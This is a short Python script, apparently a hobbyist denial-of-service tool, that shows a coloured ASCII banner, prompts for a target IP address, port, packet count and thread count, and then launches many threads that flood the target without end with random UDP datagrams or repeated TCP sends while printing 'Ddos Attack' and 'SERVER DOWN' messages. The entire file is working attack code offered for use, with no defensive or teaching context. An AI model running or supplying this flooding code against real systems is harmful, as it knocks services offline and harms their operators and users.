import random
import socket
import threading

print("\033[92m")
print("""
    Lalayan:


$$\   $$\  $$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$\  
$$ | $$  |$$  __$$\ $$  __$$\ $$$\    $$$ |$$  __$$\ 
$$ |$$  / $$ /  $$ |$$ /  \__|$$$$\  $$$$ |$$ |  $$ |
$$$$$  /  $$ |  $$ |\$$$$$$\  $$\$$\$$ $$ |$$$$$$$  |
$$  $$<   $$ |  $$ | \____$$\ $$ \$$$  $$ |$$  ____/ 
$$ |\$$\  $$ |  $$ |$$\   $$ |$$ |\$  /$$ |$$ |      
$$ | \$$\  $$$$$$  |\$$$$$$  |$$ | \_/ $$ |$$ |      
\__|  \__| \______/  \______/ \__|     \__|\__|      
                                                     
             
                                                                                                  

""")
print("\033[97m")
ip= str(input(" ip :"))
port= int(input(" port :"))
choice = str(input(" Ddos Kurdawari?? (y/n):"))
times= int(input(" Packet :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Mr. Xattar IT Ddos Attack!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Mr. Xattar IT Ddos Attack!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
